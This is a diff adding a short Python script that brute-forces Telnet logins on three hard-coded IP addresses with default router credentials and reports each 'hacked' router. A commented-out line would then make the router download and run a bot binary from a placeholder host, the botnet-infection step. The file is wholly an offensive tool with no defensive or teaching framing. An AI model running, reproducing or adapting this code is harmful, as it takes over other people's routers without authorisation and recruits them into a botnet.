@@ -1,0 +1,23 @@
+import socket
+
+IPS = ["187.84.133.99", "173.89.206.173", "75.249.135.102"]
+CREDS = [("root", "root"), ("admin", "admin"), ("root", "1234"), ("admin", "1234")]
+
+for ip in IPS:
+    try:
+        s = socket.socket()
+        s.settimeout(3)
+        s.connect((ip, 23))
+        s.recv(1024)
+        for u, p in CREDS:
+            s.sendall((u + "\n").encode())
+            s.recv(1024)
+            s.sendall((p + "\n").encode())
+            res = s.recv(1024)
+            if b"incorrect" not in res:
+                print(f"[+] ROUTER HACKEADO: {ip} | {u}:{p}")
+                # s.sendall(b"wget http://TU_IP/bot.arm -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot\n")
+                break
+        s.close()
+    except:
+        pass
